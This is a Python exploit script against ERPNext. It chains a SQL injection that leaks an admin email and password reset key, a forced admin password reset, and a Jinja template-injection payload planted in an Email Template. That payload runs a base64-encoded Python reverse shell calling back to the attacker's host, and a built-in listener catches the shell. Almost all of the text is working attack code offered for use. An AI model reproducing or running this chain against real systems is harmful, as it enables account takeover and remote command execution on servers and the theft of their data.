#!/usr/bin/python3
import requests as r, base64 as b64, sys, socket, json, random, string, threading, time

re = r.Session()

def hookadmin(): #This function changes admin password using sqli vulnerability
        greq = re.get("http://{}:{}".format(rhost,rport))
        preq = re.post("http://{}:{}".format(rhost,rport), data={"cmd":"frappe.utils.global_search.web_search","text":"pwn","scope":"\" UNION ALL SELECT 0,0,0,0,name COLLATE utf8mb4_general_ci FROM __Auth WHERE name LIKE '%@%'#", "limit":"1"})
        presult = json.loads(preq.text)
        email = presult['message'][0]['route']
        resetreq = re.post("http://{}:{}".format(rhost,rport), data={"cmd":"frappe.core.doctype.user.user.reset_password", "user":email})
        if "Password reset instructions have been sent to your email" in resetreq.text:
                print("[+] Password reset email sent to this addr: {}".format(email))
        else:
                print("Error occured...")
                sys.exit()
        keyreq = re.post("http://{}:{}".format(rhost,rport), data={"cmd":"frappe.utils.global_search.web_search","text":"pwn","scope":"\" UNION ALL SELECT 1,2,3,reset_password_key COLLATE utf8mb4_general_ci,name COLLATE utf8mb4_general_ci FROM tabUser WHERE name=\"zeljka.k@randomdomain.com\"#"})
        resetkey = json.loads(keyreq.text)['message'][0]['title']
        print("[+] Password reset key: {}".format(resetkey))
        passreset = re.post("http://{}:{}".format(rhost,rport), data={"cmd":"frappe.core.doctype.user.user.update_password", "key":resetkey, "old_password":"","new_password":"h@ck3D!!!","logout_all_sessions":"0"})
        print("[+] Password changed, new pass: h@ck3D!!!")

def exploit():
        print("[+] Starting SSTI exploitation...")
        doc3id = ''.join(random.choices(string.ascii_lowercase, k=8))
        doc3 = "{{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 1\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"zeljka.k@randomdomain.com\",\"__newname\":\"{}\",\"subject\":\"{}\",\"response\":\"<div>{{% set data = ''|attr('\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f')|attr('\\\\x5f\\\\x5fbase\\\\x5f\\\\x5f')|attr('\\\\x5f\\\\x5fsubclasses\\\\x5f\\\\x5f')() %}}</div><div>{{% set test = data|string %}}</div><div>{{% set list = test.split(',') %}}</div><div>{{% for value in list %}}</div><div>{{%if \\\"subprocess.Popen\\\" in value %}}</div><div>{{{{()|attr('\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f')|attr('\\\\x5f\\\\x5fbase\\\\x5f\\\\x5f')|attr('\\\\x5f\\\\x5fsubclasses\\\\x5f\\\\x5f')()|attr('\\\\x5f\\\\x5fgetitem\\\\x5f\\\\x5f')(loop.index|int-1)('echo {} | base64 -d | bash',shell=True,stdout=-1)|attr('communicate')()|attr('\\\\x5f\\\\x5fgetitem\\\\x5f\\\\x5f')(0)|attr('decode')('utf-8')}}}}</div><div>{{% endif %}}</div><div>{{% endfor %}}</div>\"}}".format(doc3id,doc3id,payload64.decode())
        createlist = re.post("http://{}:{}/api/method/frappe.desk.form.save.savedocs".format(rhost,rport), data={"doc":doc3, "action":"Save"})
        print("[+] Created template, Firing the cannon for the shell!")
        time.sleep(5)
        getlist = re.post("http://{}:{}/api/method/frappe.email.doctype.email_template.email_template.get_email_template".format(rhost,rport), data={"template_name":"{}".format(doc3id), "doc":"{{\"name\":\"{}\"}}".format(doc3id)})

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    conn, addr = s.accept()
    print('[+] Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

if __name__ == "__main__":
        if len(sys.argv) != 5:
                print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT>\n".format(sys.argv[0]))
                print("(+) RHOST - Remote server which runs vulnerable version of ERPNext")
                print("(+) RPORT - Remote webmail port")
                print("(+) LHOST - Local IP Address to get shell")
                print("(+) LPORT - Local Port to get shell\n")
                sys.exit(-1)
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]

        payload64 = b64.b64encode("python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((\"{}\",int(\"{}\")));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'".format(lhost,lport).encode('utf-8'))

        hookadmin()
        listener_thread = threading.Thread(target=listen, args=(lhost, lport))
        listener_thread.start()
        exploit()
        listener_thread.join()
